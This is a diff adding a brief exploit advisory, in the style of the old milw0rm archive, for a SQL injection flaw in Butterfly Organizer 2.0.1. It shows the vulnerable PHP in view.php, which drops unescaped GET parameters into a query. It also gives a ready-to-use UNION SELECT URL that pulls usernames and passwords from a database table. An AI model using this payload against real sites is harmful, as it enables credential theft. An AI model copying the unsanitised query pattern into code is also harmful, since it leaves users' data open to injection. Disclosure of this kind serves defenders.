@@ -1,0 +1,35 @@
+#########################################################################################
+[0x01] Informations:
+
+Name           : Butterfly Organizer 2.0.1 Sql Injection
+Download       : http://www.hotscripts.com/jump.php?listing_id=72677&jump_type=1
+Vulnerability  : Remote Sql Injection
+Author         : Osirys
+Contact        : osirys[at]live[dot]it
+Notes          : Proud to be Italian
+*              : Same bug of the previous version: http://milw0rm.com/exploits/5797
+
+#########################################################################################
+[0x02] Bug:
+
+Bugged file is /[path]/view.php
+
+[CODE]
+$mytable = $_GET['mytable'];
+$id = $_GET['id'];
+
+$result = mysql_query("SELECT * FROM ".$mytable." WHERE id=$id",$database);
+$myrow = mysql_fetch_array($result);
+[/CODE]
+
+Query accept direct GET input, so we can inject hell sql code.
+To avoid this vulnerability, just escape GET input.
+
+#########################################################################################
+[0x03] Exploit:
+
+http://localhost/[path]/view.php?id=-1+union+select+0x49276d2076756c6e657261626c65203a28,2,3,name,url,username,password,8,9,10+from+test_category&mytable=test_category
+
+########################################################################################
+
+# milw0rm.com [2008-12-10]
